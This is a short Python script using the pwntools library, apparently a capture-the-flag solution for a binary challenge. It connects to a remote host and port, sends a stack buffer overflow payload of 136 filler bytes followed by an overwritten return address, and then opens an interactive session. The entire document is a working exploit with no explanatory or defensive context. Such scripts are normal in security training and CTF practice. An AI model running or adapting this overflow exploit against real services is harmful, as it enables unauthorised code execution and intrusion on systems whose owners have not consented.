from pwn import *
#p = process("./pwn")
p = remote("61.147.171.105",51848)
payload = b'A'*136 + p64(0x00400596)
p.sendline(payload)
p.interactive()

